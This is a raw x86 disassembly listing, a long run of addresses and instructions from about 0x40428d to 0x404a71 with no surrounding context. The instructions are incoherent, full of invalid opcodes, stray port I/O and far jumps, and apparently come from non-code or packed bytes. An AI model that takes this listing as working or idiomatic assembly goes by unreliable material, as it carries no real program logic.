  40428d:	sub    ebx,edi
  40428f:	xchg   esi,eax
  404290:	mov    bh,0x48
  404292:	test   BYTE PTR [ecx+0x1f1b2541],dl
  404298:	call   0x167a:0x864599bd
  40429f:	addr16 (bad) 
  4042a1:	mov    edi,0xf0c25a73
  4042a6:	mov    dh,0x37
  4042a8:	xor    al,0x8d
  4042aa:	(bad)  
  4042ac:	and    ecx,DWORD PTR [esi+0x3e]
  4042af:	or     eax,0x1122e535
  4042b4:	mov    dh,0x1a
  4042b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b7:	test   eax,0x33a9b2a7
  4042bc:	xchg   ebx,eax
  4042bd:	cmp    BYTE PTR [ebx],al
  4042bf:	sub    DWORD PTR [edx-0x73],ebx
  4042c2:	rsqrtps xmm3,XMMWORD PTR [eax]
  4042c5:	xor    ebx,DWORD PTR [esi]
  4042c7:	fsubr  QWORD PTR [ebp-0x46e55555]
  4042cd:	fiadd  DWORD PTR [ecx]
  4042cf:	leave  
  4042d0:	or     al,0xac
  4042d2:	inc    esp
  4042d3:	sti    
  4042d4:	call   0x306c6992
  4042d9:	loope  0x40433d
  4042db:	adc    DWORD PTR [ecx+eax*8+0x5a],ecx
  4042df:	fadd   QWORD PTR [esi-0x71262c7c]
  4042e5:	in     al,dx
  4042e6:	fdivrp st(5),st
  4042e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e9:	mov    esp,ss
  4042eb:	inc    eax
  4042ec:	aaa    
  4042ed:	rcl    DWORD PTR [ecx-0x1c],cl
  4042f0:	aaa    
  4042f1:	add    eax,0x76e4c009
  4042f6:	jnp    0x4042e1
  4042f8:	repz rcl esp,0x65
  4042fc:	rcr    cl,1
  4042fe:	popa   
  4042ff:	cwde   
  404300:	mov    ecx,0x1eb34d8d
  404305:	xchg   DWORD PTR gs:[edi],ebx
  404308:	mov    dl,bh
  40430a:	daa    
  40430b:	retf   
  40430c:	test   BYTE PTR ds:0x24b0e46d,bl
  404312:	or     bl,BYTE PTR [ecx]
  404314:	lahf   
  404315:	sbb    esp,ebp
  404317:	and    DWORD PTR [esi],edx
  404319:	lahf   
  40431a:	cmp    dl,al
  40431c:	push   eax
  40431d:	sahf   
  40431e:	popf   
  40431f:	pop    esi
  404320:	call   0xeeb1:0x6447011f
  404327:	sub    eax,ebp
  404329:	push   ecx
  40432a:	cmp    DWORD PTR gs:[edi+esi*2+0x1acdc539],esi
  404332:	xchg   edx,eax
  404333:	mov    bh,BYTE PTR [ebp+0x5]
  404336:	push   ds
  404337:	and    edi,DWORD PTR [edx+0x2a]
  40433a:	out    dx,eax
  40433b:	add    eax,0x10f197e0
  404340:	pop    ecx
  404341:	cdq    
  404342:	aas    
  404343:	pop    esi
  404344:	xchg   ecx,eax
  404345:	out    0x18,eax
  404347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404348:	dec    edi
  404349:	pop    edx
  40434a:	stos   DWORD PTR es:[edi],eax
  40434b:	std    
  40434c:	pop    eax
  40434d:	add    al,al
  40434f:	add    esi,DWORD PTR es:[edi-0x2adfdc7b]
  404356:	into   
  404357:	js     0x4043b6
  404359:	in     eax,0x51
  40435b:	lahf   
  40435c:	aam    0x40
  40435e:	imul   esp,edi,0x1ca09654
  404364:	xor    eax,0x30ddc28e
  404369:	repnz inc esi
  40436b:	pop    DWORD PTR [edi]
  40436d:	lahf   
  40436e:	dec    edx
  40436f:	adc    ebp,DWORD PTR [ebx-0x72ebf299]
  404375:	nop
  404376:	push   0xffffffc7
  404378:	pop    esp
  404379:	xor    BYTE PTR [edx+0x4d056d6],0xb
  404380:	add    al,dl
  404382:	mov    al,0xff
  404384:	fst    DWORD PTR [esi]
  404386:	int3   
  404387:	aas    
  404388:	imul   esp,DWORD PTR [eax+ebp*4+0x78621b67],0xc1eb2f51
  404393:	sbb    ebp,DWORD PTR [edx-0x2c2b42e]
  404399:	mov    ecx,DWORD PTR [edx]
  40439b:	mov    DWORD PTR [ecx-0x32],edx
  40439e:	dec    esi
  40439f:	ss inc esp
  4043a1:	jno    0x404401
  4043a3:	xchg   ebp,eax
  4043a4:	inc    edi
  4043a5:	and    bh,BYTE PTR [esi+0x50c9e3c2]
  4043ab:	or     DWORD PTR [edx+0x6da13721],0xf30b2ce1
  4043b5:	inc    esi
  4043b6:	mov    cl,0xc4
  4043b8:	dec    esi
  4043b9:	(bad)  
  4043bb:	and    eax,0xec600ebd
  4043c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c1:	outs   dx,BYTE PTR ds:[esi]
  4043c2:	mov    al,ds:0xeb341d42
  4043c7:	add    DWORD PTR [edx+0x31],ebp
  4043ca:	dec    ebx
  4043cb:	out    0x3b,al
  4043cd:	(bad)  
  4043cf:	push   ds
  4043d0:	fwait
  4043d1:	and    ah,BYTE PTR [edx+0x6ebd351e]
  4043d7:	lods   eax,DWORD PTR ds:[esi]
  4043d8:	push   ss
  4043d9:	ret    
  4043da:	xlat   BYTE PTR ds:[ebx]
  4043db:	jb     0x404440
  4043dd:	inc    eax
  4043de:	aas    
  4043df:	sbb    dh,al
  4043e1:	pop    esp
  4043e2:	jp     0x4043db
  4043e4:	adc    al,0xbf
  4043e6:	adc    eax,0x4704c559
  4043eb:	ja     0x4043aa
  4043ed:	jp     0x40437f
  4043ef:	cmp    eax,0x3d9dd8b9
  4043f4:	in     eax,dx
  4043f5:	cmc    
  4043f6:	mov    ebp,0x80befc2e
  4043fb:	inc    ebp
  4043fc:	loopne 0x40445c
  4043fe:	(bad)  
  4043ff:	xor    eax,DWORD PTR [eax+edi*8]
  404402:	inc    eax
  404403:	cmp    al,0x27
  404405:	(bad)  [edi+0x15]
  404408:	test   al,0x4b
  40440a:	ins    DWORD PTR es:[edi],dx
  40440b:	mov    bl,0x5b
  40440d:	inc    edi
  40440e:	ins    BYTE PTR es:[edi],dx
  40440f:	sahf   
  404410:	lds    esp,FWORD PTR [eax+0x2a40c29d]
  404416:	adc    al,0xa6
  404418:	dec    esp
  404419:	dec    ebp
  40441a:	or     eax,0x2703a89e
  40441f:	fnstenv [ebx+0x35b8f417]
  404425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404426:	pop    ss
  404427:	and    esp,DWORD PTR [ebp+0x9e1843b]
  40442d:	jns    0x404402
  40442f:	sahf   
  404430:	mov    BYTE PTR [edi-0x2d],bh
  404433:	ret    0x1910
  404436:	adc    DWORD PTR [esi],0x24558770
  40443c:	fnstcw WORD PTR [eax-0x7c3b5722]
  404442:	xchg   BYTE PTR [eax],dl
  404444:	jp     0x404424
  404446:	hlt    
  404447:	gs pop ds
  404449:	sti    
  40444a:	ret    0x43f6
  40444d:	loop   0x404436
  40444f:	jmp    DWORD PTR [eax-0x44f66e81]
  404455:	pop    edx
  404456:	sub    edi,DWORD PTR [ecx+0x4a5da62e]
  40445c:	mov    al,ds:0xb51564ec
  404461:	addr16 (bad) 
  404463:	sti    
  404464:	pushf  
  404465:	imul   esp,DWORD PTR [ebx+ebp*4],0x64
  404469:	jp     0x40448f
  40446b:	pop    esi
  40446c:	inc    edi
  40446d:	pop    ebp
  40446e:	adc    edi,edi
  404470:	xchg   ebx,eax
  404471:	add    edx,DWORD PTR [eax-0x31fefa95]
  404477:	push   esi
  404478:	inc    esp
  404479:	dec    edx
  40447a:	outs   dx,DWORD PTR ds:[esi]
  40447b:	mov    eax,0x7f89fe18
  404480:	xchg   esp,eax
  404481:	(bad)  
  404482:	push   ebx
  404483:	clc    
  404484:	in     al,dx
  404485:	jne    0x4044a5
  404487:	sub    DWORD PTR [eax+ebx*2+0x7d8f1369],0x73c68141
  404492:	jb     0x4044ca
  404494:	cmp    ch,cl
  404496:	es push ebp
  404498:	mov    al,0xf0
  40449a:	mov    dl,0xd0
  40449c:	ret    0x1198
  40449f:	and    al,0x6d
  4044a1:	and    al,0x64
  4044a3:	mov    cl,0x2
  4044a5:	call   FWORD PTR [eax+esi*2]
  4044a8:	cmp    cl,ch
  4044aa:	lahf   
  4044ab:	mov    edi,DWORD PTR [ecx-0x4fbe45f7]
  4044b1:	add    DWORD PTR [eax+0x13608381],esp
  4044b7:	scas   al,BYTE PTR es:[edi]
  4044b8:	ins    DWORD PTR es:[edi],dx
  4044b9:	xor    DWORD PTR [ecx-0x5ff7a0e5],esi
  4044bf:	jecxz  0x404498
  4044c1:	ret    
  4044c2:	inc    ecx
  4044c3:	xor    al,cl
  4044c5:	scas   al,BYTE PTR es:[edi]
  4044c6:	test   eax,0x25ab6c6a
  4044cb:	lahf   
  4044cc:	add    BYTE PTR [ebp+edi*8+0x9],cl
  4044d0:	(bad)  
  4044d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d2:	lods   al,BYTE PTR ds:[esi]
  4044d3:	mov    edi,0x34b589b7
  4044d8:	pop    es
  4044d9:	std    
  4044da:	repz push esi
  4044dc:	inc    ecx
  4044dd:	jle    0x4044c4
  4044df:	push   0xd528e2f6
  4044e4:	fldcw  WORD PTR [ebp+0x5c9602de]
  4044ea:	ins    BYTE PTR es:[edi],dx
  4044eb:	or     al,0x51
  4044ed:	push   ebp
  4044ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ef:	mov    es,ebx
  4044f1:	pop    eax
  4044f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f3:	div    BYTE PTR [edx-0x55c1c470]
  4044f9:	add    eax,0x2ec58d2c
  4044fe:	fidivr WORD PTR [esi]
  404500:	out    dx,al
  404501:	inc    edx
  404502:	cmp    ebp,edi
  404504:	jnp    0x404521
  404506:	fnstsw WORD PTR [edx-0x4f2a90ce]
  40450c:	(bad)  
  40450e:	out    dx,al
  40450f:	in     eax,dx
  404510:	daa    
  404511:	and    dl,cl
  404513:	mov    edx,cs
  404515:	push   ss
  404516:	mov    edi,0x3ee7aa3d
  40451b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40451c:	mov    dl,0xfb
  40451e:	sub    edi,ebp
  404520:	ja     0x4044cd
  404522:	mov    eax,ds:0xf7aeec4d
  404527:	push   edi
  404528:	mov    eax,ds:0x2f4a6630
  40452d:	idiv   BYTE PTR [edi+0x9]
  404530:	fwait
  404531:	adc    DWORD PTR [edx+ecx*4+0x77],eax
  404535:	mov    bl,0x22
  404537:	lea    edi,ds:[esi+0x5d]
  40453b:	push   edi
  40453c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40453d:	inc    edx
  40453e:	imul   esi,DWORD PTR [ebp+0x55],0xffffffad
  404542:	hlt    
  404543:	jno    0x40450e
  404545:	xchg   BYTE PTR [ebp-0x48],cl
  404548:	retf   0xa884
  40454b:	and    bl,BYTE PTR [edx+ecx*2]
  40454e:	xor    al,0x81
  404550:	add    BYTE PTR [eax-0x7a],bh
  404553:	sub    BYTE PTR [ecx-0x1a],bh
  404556:	mov    eax,ds:0xb902d84b
  40455b:	fisub  DWORD PTR [edx]
  40455d:	in     al,dx
  40455e:	inc    esi
  40455f:	sbb    DWORD PTR [ebp+edx*1-0x30b76171],esi
  404566:	mov    edi,0x2a16d56f
  40456b:	mov    WORD PTR [ebp+0x32],ds
  40456e:	mov    ch,0xaa
  404570:	jg     0x40451b
  404572:	push   ebx
  404573:	retf   0xb5c3
  404576:	sub    al,dh
  404578:	test   BYTE PTR [eax],0x9b
  40457b:	add    ebp,ebp
  40457d:	xor    ebx,0x8263d376
  404583:	pusha  
  404584:	pop    esi
  404585:	add    esp,edi
  404587:	mov    al,ds:0x6ff9056c
  40458c:	adc    eax,edx
  40458e:	loope  0x4045f4
  404590:	sub    al,BYTE PTR [ebx+0x6fd5cc12]
  404596:	push   es
  404597:	add    DWORD PTR [eax+0x4ab8a80f],ecx
  40459d:	add    eax,0x1c638be9
  4045a2:	in     al,dx
  4045a3:	aaa    
  4045a4:	xor    ah,BYTE PTR [esi+0x77f42a86]
  4045aa:	inc    ebp
  4045ab:	ret    0x97a0
  4045ae:	push   edx
  4045af:	std    
  4045b0:	xchg   edx,ebx
  4045b2:	inc    ebp
  4045b3:	mov    esi,DWORD PTR [ecx]
  4045b5:	sub    ebx,ecx
  4045b7:	mov    dl,0x21
  4045b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045ba:	rcl    BYTE PTR [ecx],0xdf
  4045bd:	mov    bh,0x2f
  4045bf:	in     al,0x4c
  4045c1:	mov    dh,0x8d
  4045c3:	mov    ah,0x41
  4045c5:	inc    eax
  4045c6:	inc    edx
  4045c7:	hlt    
  4045c8:	jmp    DWORD PTR [eax-0x7e5d8433]
  4045ce:	div    BYTE PTR [eax]
  4045d0:	mov    ds:0x1b3a7c30,eax
  4045d5:	js     0x40461f
  4045d7:	pop    ss
  4045d8:	imul   ebp,DWORD PTR [esi-0x38],0xffffffcf
  4045dc:	(bad)  
  4045dd:	mov    edx,0x9e1b0f5b
  4045e2:	pop    ebp
  4045e3:	sub    al,0x1c
  4045e5:	dec    esi
  4045e6:	jle    0x4045da
  4045e8:	sbb    DWORD PTR cs:[eax-0x3a],edi
  4045ec:	fidiv  DWORD PTR [ecx+0x1751ec61]
  4045f2:	push   edi
  4045f3:	jb     0x40464a
  4045f5:	inc    edi
  4045f6:	fs pop ds
  4045f8:	fdiv   QWORD PTR [ecx-0x42]
  4045fb:	mov    ch,bh
  4045fd:	dec    ebp
  4045fe:	jo     0x404610
  404600:	jo     0x40465e
  404602:	mov    ds:0xfa5903a,al
  404607:	imul   edi,DWORD PTR [ebp-0x51bd31b8],0xa0bcceb7
  404611:	ins    DWORD PTR es:[edi],dx
  404612:	icebp  
  404613:	jecxz  0x4045fa
  404615:	sar    DWORD PTR [ecx-0x787b2c35],cl
  40461b:	mov    esp,eax
  40461d:	dec    ebx
  40461e:	sub    edx,DWORD PTR [edx-0x30b91114]
  404624:	stos   DWORD PTR es:[edi],eax
  404625:	push   cs
  404626:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404628:	inc    esi
  404629:	int3   
  40462a:	dec    ebx
  40462b:	mov    ch,0x7f
  40462d:	ins    DWORD PTR es:[edi],dx
  40462e:	cmp    ch,bh
  404630:	jle    0x404611
  404632:	mov    WORD PTR [eax+0x32072a82],es
  404638:	inc    ebx
  404639:	imul   esp,DWORD PTR [edx],0x1686695a
  40463f:	leave  
  404640:	ret    0xc728
  404643:	fiadd  WORD PTR [eax+0x259c0ffb]
  404649:	push   es
  40464a:	add    DWORD PTR [ebp-0x7820365a],ebp
  404650:	xor    BYTE PTR [eax-0x13e972f4],bl
  404656:	test   eax,0x76d9ea18
  40465b:	jo     0x404642
  40465d:	adc    ebx,DWORD PTR [esi-0x3d]
  404660:	pop    edi
  404661:	adc    BYTE PTR [esi+ecx*4],bh
  404664:	stos   DWORD PTR es:[edi],eax
  404665:	and    eax,DWORD PTR [edx+0x26ffbfa3]
  40466b:	fcomp  DWORD PTR [ebp+ecx*1-0xeee4f9b]
  404672:	inc    ebp
  404673:	repz dec ebx
  404675:	nop
  404676:	inc    ebp
  404677:	gs xchg edx,eax
  404679:	jmp    0x40460b
  40467b:	mov    ecx,0x709aebad
  404680:	sub    eax,0xdb9891b5
  404685:	sub    eax,0x6acb99e9
  40468a:	cmp    ebp,DWORD PTR [esi+0x22]
  40468d:	idiv   BYTE PTR [ecx+edx*4]
  404690:	mov    ebx,0x857b634b
  404695:	xor    al,0x16
  404697:	jl     0x404699
  404699:	inc    ecx
  40469a:	and    DWORD PTR [edi-0x2d],edx
  40469d:	jp     0x404664
  40469f:	(bad)  
  4046a1:	sub    BYTE PTR [eax+ebx*4-0x57],0xfc
  4046a6:	push   ecx
  4046a7:	int3   
  4046a8:	mov    edx,esp
  4046aa:	add    ecx,DWORD PTR ds:0x635b4223
  4046b0:	sub    dl,BYTE PTR [ebp-0x51]
  4046b3:	xchg   edx,eax
  4046b4:	les    edi,FWORD PTR [eax-0x65]
  4046b7:	push   es
  4046b8:	lods   eax,DWORD PTR ds:[esi]
  4046b9:	xor    cl,bl
  4046bb:	out    dx,eax
  4046bc:	cdq    
  4046bd:	cmp    DWORD PTR [ecx+eax*8],edx
  4046c0:	xchg   edi,eax
  4046c1:	mov    al,ds:0x5f38dcd7
  4046c6:	or     BYTE PTR [ebx+eax*2],al
  4046c9:	(bad)  
  4046ca:	mov    edi,0xcce9dcb9
  4046cf:	xor    ah,bh
  4046d1:	pop    es
  4046d2:	push   edx
  4046d3:	arpl   WORD PTR [edx+0x268329ba],dx
  4046d9:	and    BYTE PTR ds:0x8e4d0f19,0x82
  4046e0:	or     eax,0xef6e0b85
  4046e5:	xlat   BYTE PTR ds:[ebx]
  4046e6:	out    dx,eax
  4046e7:	mov    ds:0xebe94e56,al
  4046ec:	mov    edx,0x8974787e
  4046f1:	dec    ebp
  4046f2:	in     al,dx
  4046f3:	sub    edx,edi
  4046f5:	sbb    BYTE PTR [eax-0x73],ch
  4046f8:	sub    DWORD PTR [ebp+0x8],edi
  4046fb:	sahf   
  4046fc:	inc    ebp
  4046fd:	push   es
  4046fe:	push   eax
  4046ff:	rcl    DWORD PTR [edx+0x6d],0x55
  404703:	jnp    0x40474f
  404705:	mov    dl,BYTE PTR [bp-0x3a]
  404709:	mov    ebp,0x6daafec3
  40470e:	out    dx,eax
  40470f:	out    0x65,al
  404711:	mov    gs,WORD PTR [eax+0x5a32819c]
  404717:	outs   dx,DWORD PTR ds:[esi]
  404718:	wbinvd 
  40471a:	and    edi,DWORD PTR [ebp+eiz*1+0x52f245ff]
  404721:	test   DWORD PTR [eax+0x4ddc3540],0xc85ebbf6
  40472b:	je     0x4047ac
  40472d:	imul   ebp,DWORD PTR ds:[ebx-0x156b9570],0x80d628de
  404738:	adc    ch,BYTE PTR [eax-0x7]
  40473b:	add    DWORD PTR fs:[esp+eiz*2-0x4d2b1ce8],0xffffff95
  404744:	or     DWORD PTR [eax],eax
  404746:	pop    ds
  404747:	push   esi
  404748:	loope  0x40471e
  40474a:	and    bh,BYTE PTR [ebx]
  40474c:	mov    BYTE PTR [ebp-0x3b],ch
  40474f:	out    dx,al
  404750:	(bad)  
  404754:	out    0x30,eax
  404756:	stc    
  404757:	jg     0x4047b0
  404759:	mov    ecx,0xabc4b75e
  40475e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40475f:	stos   DWORD PTR es:[edi],eax
  404760:	xchg   esp,eax
  404761:	push   edx
  404762:	test   eax,0x693bf10
  404767:	adc    DWORD PTR [ebx+0x35],ecx
  40476a:	ret    0xe592
  40476d:	iretw  
  40476f:	jbe    0x404771
  404771:	lds    ebp,FWORD PTR [ecx+0x7f4f548d]
  404777:	and    esi,edx
  404779:	jmp    0x58bb:0x1c756519
  404780:	push   0x58
  404782:	mov    bl,0x52
  404784:	aas    
  404785:	gs aaa 
  404787:	gs (bad) 
  404789:	addr16 xor eax,0x196934d7
  40478f:	daa    
  404790:	mov    esi,DWORD PTR [edx+eiz*8+0x60]
  404794:	loop   0x404773
  404796:	popf   
  404797:	nop
  404798:	pop    es
  404799:	mov    bl,0xeb
  40479b:	enter  0xef87,0xcc
  40479f:	adc    bl,0x8f
  4047a2:	push   0x83fb8a8a
  4047a7:	pop    ecx
  4047a8:	and    al,0x7e
  4047aa:	cmp    bl,bh
  4047ac:	pop    ds
  4047ad:	pop    esp
  4047ae:	add    ah,ah
  4047b0:	xor    dh,cl
  4047b2:	test   al,0xc6
  4047b4:	xor    eax,0x978dfabb
  4047b9:	dec    ebx
  4047ba:	bnd ret 0xe0bd
  4047be:	mov    edi,0x123e8518
  4047c3:	mov    eax,0xcdd807eb
  4047c8:	xchg   esi,eax
  4047c9:	mov    bh,0x77
  4047cb:	pop    edx
  4047cc:	add    al,0x53
  4047ce:	retf   
  4047cf:	cwde   
  4047d0:	mov    ecx,0x54e66ba6
  4047d5:	pop    ebx
  4047d6:	mov    edx,0xb0e8b043
  4047db:	ins    DWORD PTR es:[edi],dx
  4047dc:	in     eax,dx
  4047dd:	popa   
  4047de:	sbb    esi,DWORD PTR [edi-0x1cbad006]
  4047e4:	adc    eax,0x816ccd8f
  4047e9:	repnz pop es
  4047eb:	push   edi
  4047ec:	inc    eax
  4047ed:	sar    DWORD PTR [ebx-0x7c884db4],0x81
  4047f4:	mov    edx,0x99d8543a
  4047f9:	dec    edx
  4047fa:	and    BYTE PTR [ecx],0x7c
  4047fd:	sub    DWORD PTR [esi+ecx*2-0x5],esi
  404801:	repnz or BYTE PTR [eax],bh
  404804:	(bad)  
  404805:	or     bl,BYTE PTR [edx]
  404807:	test   BYTE PTR [ebp-0x6072e5e6],dh
  40480d:	jae    0x4047dc
  40480f:	(bad)  
  404810:	jmp    0x9c46:0xc5473f5e
  404817:	loop   0x40483a
  404819:	dec    esp
  40481a:	adc    bl,al
  40481c:	in     al,dx
  40481d:	cdq    
  40481e:	mov    dh,0x30
  404820:	and    BYTE PTR [ebx+edi*4-0x4b],dh
  404824:	pop    edi
  404825:	xchg   esi,eax
  404826:	or     bl,BYTE PTR [esi-0xc62f8]
  40482c:	in     al,0x92
  40482e:	xchg   dl,dh
  404830:	sbb    eax,DWORD PTR [edx]
  404832:	stc    
  404833:	cdq    
  404834:	ret    
  404835:	test   BYTE PTR [esi+0x58],dh
  404838:	ret    
  404839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40483a:	sti    
  40483b:	pop    edx
  40483c:	adc    al,BYTE PTR [ecx+ecx*4]
  40483f:	jmp    0x1508:0xf277c93b
  404846:	xchg   edx,eax
  404847:	cld    
  404848:	mov    bl,BYTE PTR [ebp+0x1f]
  40484b:	dec    esp
  40484c:	ret    0x5415
  40484f:	add    BYTE PTR [eax+0x1f],bh
  404852:	repnz sub ch,bl
  404855:	adc    eax,0xe22ca31e
  40485a:	mov    ecx,0x6a2d55a3
  40485f:	mov    eax,0x3fd0ba19
  404864:	or     dl,dl
  404866:	mov    ebp,0xa4a0077c
  40486b:	repnz push edi
  40486d:	shl    bh,1
  40486f:	aam    0x2c
  404871:	hlt    
  404872:	mov    cl,0xee
  404874:	xor    cl,bl
  404876:	xor    esi,DWORD PTR [edx]
  404878:	hlt    
  404879:	popf   
  40487a:	cmp    edi,0x910de0e9
  404880:	and    BYTE PTR [eax-0x4e],ah
  404883:	dec    ecx
  404884:	gs mov ah,0x8c
  404887:	lock mov edx,DWORD PTR [eax-0x3ec8b272]
  40488e:	mov    ebx,0xe318dead
  404893:	cli    
  404894:	lahf   
  404895:	stos   BYTE PTR es:[edi],al
  404896:	(bad)  
  404897:	sti    
  404898:	ss out 0x37,eax
  40489b:	loope  0x404903
  40489d:	sbb    DWORD PTR [ebx-0x63],esi
  4048a0:	retf   0xfa31
  4048a3:	cmp    al,0xcc
  4048a5:	xor    BYTE PTR ds:0x72c732e8,dl
  4048ab:	repz pop eax
  4048ad:	pop    edx
  4048ae:	scas   eax,DWORD PTR es:[edi]
  4048af:	and    al,0xd
  4048b1:	stos   BYTE PTR es:[edi],al
  4048b2:	push   cs
  4048b3:	adc    al,0x65
  4048b5:	add    eax,0x4fa0a817
  4048ba:	add    dl,bh
  4048bc:	repnz mov dl,0x51
  4048bf:	in     al,0xd3
  4048c1:	pop    esi
  4048c2:	xor    bh,BYTE PTR [esi+eax*2]
  4048c5:	and    DWORD PTR [ebx],ebp
  4048c7:	pop    ebx
  4048c8:	xchg   edi,eax
  4048c9:	test   eax,0xf8f27bc4
  4048ce:	ins    BYTE PTR es:[edi],dx
  4048cf:	xchg   edi,eax
  4048d0:	jge    0x404885
  4048d2:	mov    esi,0xb49a6c5b
  4048d7:	sar    ah,0x21
  4048da:	add    DWORD PTR [ecx+edi*8],ebp
  4048dd:	mov    bh,0x2e
  4048df:	lods   eax,DWORD PTR ds:[esi]
  4048e0:	mov    esi,0xd6a907f9
  4048e5:	xor    eax,0xf2da966f
  4048ea:	in     al,0x95
  4048ec:	ret    
  4048ed:	xor    bh,BYTE PTR [edx]
  4048ef:	idiv   DWORD PTR [edx]
  4048f1:	pop    eax
  4048f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f3:	clc    
  4048f4:	lods   eax,DWORD PTR ds:[esi]
  4048f5:	jmpw   0x6e8b
  4048f9:	adc    DWORD PTR [eax],edx
  4048fb:	lods   eax,DWORD PTR ds:[esi]
  4048fc:	cmp    al,0x47
  4048fe:	cmp    eax,0xb18ca46c
  404903:	jge    0x404951
  404905:	push   ebp
  404906:	fwait
  404907:	mov    eax,ds:0x3058cfbf
  40490c:	and    ecx,DWORD PTR [eax+ebp*4-0x1c1f1a2b]
  404913:	adc    al,0x67
  404915:	cli    
  404916:	mov    ds:0x26d7c822,eax
  40491b:	mov    ebp,eax
  40491d:	clc    
  40491e:	ds mov bl,0x4c
  404921:	and    al,0x99
  404923:	lods   eax,DWORD PTR ds:[esi]
  404924:	cli    
  404925:	les    esp,FWORD PTR [edx]
  404927:	sbb    eax,0xa715d579
  40492c:	mov    ebp,0xa3a53316
  404931:	and    esi,DWORD PTR [ebx+eiz*8-0x5210503c]
  404938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404939:	sbb    al,0xa7
  40493b:	pop    ds
  40493c:	jne    0x4048f2
  40493e:	in     al,0x56
  404940:	icebp  
  404941:	jp     0x4048c4
  404943:	or     ch,BYTE PTR [ebx+0x36bdf744]
  404949:	not    ebx
  40494b:	and    ebx,DWORD PTR [eax]
  40494d:	push   ebx
  40494e:	add    al,0x74
  404950:	mov    ds,WORD PTR [ebx]
  404952:	fistp  DWORD PTR [esi+0x36]
  404955:	cmp    dh,al
  404957:	add    bh,cl
  404959:	mov    al,0x8d
  40495b:	stc    
  40495c:	push   0xffffffc2
  40495e:	xor    al,0x2a
  404960:	push   0x23
  404962:	(bad)  
  404963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404964:	dec    eax
  404965:	cmp    al,0xc9
  404967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404968:	jno    0x4049c2
  40496a:	sbb    al,0x68
  40496c:	fist   WORD PTR [edx+0x22e0bf82]
  404972:	(bad)  
  404974:	(bad)  
  404976:	mov    dl,dh
  404978:	mov    edi,0xc97145ed
  40497d:	sbb    DWORD PTR [edx],esp
  40497f:	inc    ebp
  404980:	mov    ebp,DWORD PTR [eax+0x6858f6d3]
  404986:	pop    ecx
  404987:	mov    dh,0xd1
  404989:	mov    eax,0xe72495b6
  40498e:	lea    eax,[esi+0x264735e4]
  404994:	shl    DWORD PTR [ecx+eax*8-0x6f],1
  404998:	mov    eax,0xacae4c1d
  40499d:	cs aas 
  40499f:	in     al,dx
  4049a0:	enter  0x78e6,0xa8
  4049a4:	sub    al,0x20
  4049a6:	outs   dx,BYTE PTR ds:[esi]
  4049a7:	push   es
  4049a8:	inc    edx
  4049a9:	movntps XMMWORD PTR [esi-0x5ea26625],xmm5
  4049b0:	stos   DWORD PTR es:[edi],eax
  4049b1:	sbb    BYTE PTR [ecx],0x9c
  4049b4:	or     al,ch
  4049b6:	cmp    DWORD PTR [ecx],ecx
  4049b8:	rol    BYTE PTR [esi+edi*2-0x26fb33ff],cl
  4049bf:	add    dl,BYTE PTR [eax+eax*1+0x74]
  4049c3:	fnstcw WORD PTR [ebx+0x58524ce5]
  4049c9:	and    dh,BYTE PTR fs:[ebp-0x18]
  4049cd:	add    DWORD PTR [ecx+0x57d078a0],ecx
  4049d3:	cs mov esi,0xdd89bcd
  4049d9:	je     0x404a08
  4049db:	xor    dh,BYTE PTR [esi+0x6de7fa18]
  4049e1:	je     0x404a44
  4049e3:	push   ds
  4049e4:	outs   dx,DWORD PTR ds:[esi]
  4049e5:	(bad)  
  4049e6:	and    cl,BYTE PTR [ebx+0x5a]
  4049e9:	push   eax
  4049ea:	add    BYTE PTR [ecx],ch
  4049ec:	or     eax,0x636123e3
  4049f1:	mov    cl,0xfd
  4049f3:	xchg   eax,edi
  4049f5:	push   esi
  4049f6:	add    eax,0x59cb0e82
  4049fb:	aad    0x1b
  4049fd:	xchg   BYTE PTR ds:0xb1ec38c4,al
  404a03:	mov    dl,0xb1
  404a05:	sub    DWORD PTR ss:[ebp-0xb1d6cd5],0x4c
  404a0d:	adc    edi,DWORD PTR ds:0xc6ae3c37
  404a13:	ds fwait
  404a15:	test   DWORD PTR ds:0x91b68b12,0x7cd9f0bf
  404a1f:	jbe    0x404a7e
  404a21:	mov    al,0x78
  404a23:	mov    cs,WORD PTR [esi+0x1a]
  404a26:	pop    es
  404a27:	sub    DWORD PTR [edi-0x59],ebx
  404a2a:	jmp    0x503f:0x60980c75
  404a31:	jle    0x4049e3
  404a33:	sub    ebx,eax
  404a35:	sahf   
  404a36:	popa   
  404a37:	mov    DWORD PTR [edi+ecx*8-0x2de6419f],esi
  404a3e:	mov    BYTE PTR ds:[ecx],bl
  404a41:	fild   QWORD PTR [eax]
  404a43:	daa    
  404a44:	mov    esp,0xd2cf79e1
  404a49:	icebp  
  404a4a:	dec    edi
  404a4b:	mov    ds:0xaab5a4d8,al
  404a50:	mov    ah,al
  404a52:	sub    al,0x7d
  404a54:	and    al,0x22
  404a56:	jo     0x404a77
  404a58:	std    
  404a59:	xchg   ecx,eax
  404a5a:	jecxz  0x4049ff
  404a5c:	int3   
  404a5d:	ins    BYTE PTR es:[edi],dx
  404a5e:	jg     0x404aa7
  404a60:	mov    al,ds:0x22dadbc2
  404a65:	scas   eax,DWORD PTR es:[edi]
  404a66:	adc    ecx,DWORD PTR [ebp-0x46]
  404a69:	dec    edx
  404a6a:	mov    ch,0x8f
  404a6c:	retf   
  404a6d:	cli    
  404a6e:	adc    eax,DWORD PTR [edx-0x10]
  404a71:	lahf   
